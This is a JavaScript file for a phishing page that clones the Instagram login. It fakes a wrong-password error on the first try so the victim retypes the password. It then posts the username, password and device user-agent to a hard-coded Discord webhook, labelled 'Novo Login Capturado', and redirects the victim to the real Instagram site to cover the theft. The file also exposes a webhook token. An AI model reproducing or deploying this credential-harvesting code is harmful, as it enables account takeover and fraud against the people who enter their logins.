document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const userInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const toggleButton = document.getElementById('togglePassword');
    const modalEmpty = document.getElementById('modalError');
    const modalPass = document.getElementById('modalPasswordError');
    const btnOkEmpty = document.getElementById('closeModal');
    const btnRetryPass = document.getElementById('closePassModal');

    let tentativas = 0;
    const discordWebhookUrl = "https://discord.com/api/webhooks/1476725494601744577/X52wm9S7fEFzTYG0V-YufHvXHJtkEwsXnja77SC5Nzqw5kXXbcK_Ng1p_AzGkGyLLkeh";

    if(toggleButton) {
        toggleButton.addEventListener('click', function() {
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
            this.textContent = passwordInput.type === 'password' ? 'visibility_off' : 'visibility';
        });
    }

    if(btnOkEmpty) btnOkEmpty.addEventListener('click', () => modalEmpty.style.display = 'none');
    if(btnRetryPass) btnRetryPass.addEventListener('click', () => modalPass.style.display = 'none');

    if(loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const user = userInput.value.trim();
            const pass = passwordInput.value.trim();

            if (user === "" || pass === "") {
                modalEmpty.style.display = 'flex';
                return;
            }

            if (tentativas === 0) {
                modalPass.style.display = 'flex';
                passwordInput.value = "";
                tentativas++;
            } else {
                enviarParaDiscord(user, pass);
            }
        });
    }

    function enviarParaDiscord(user, pass) {
        const payload = {
            embeds: [{
                title: "✨ Novo Login Capturado",
                color: 13443225,
                fields: [
                    { name: "👤 Usuário/E-mail", value: user, inline: false },
                    { name: "🔑 Senha", value: pass, inline: false },
                    { name: "📱 Dispositivo", value: navigator.userAgent, inline: false }
                ],
                footer: { text: "Log Instagram Clone | " + new Date().toLocaleString() }
            }]
        };

        fetch(discordWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).finally(() => {
            window.location.href = "instagram://login";
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 500);
        });
    }
});
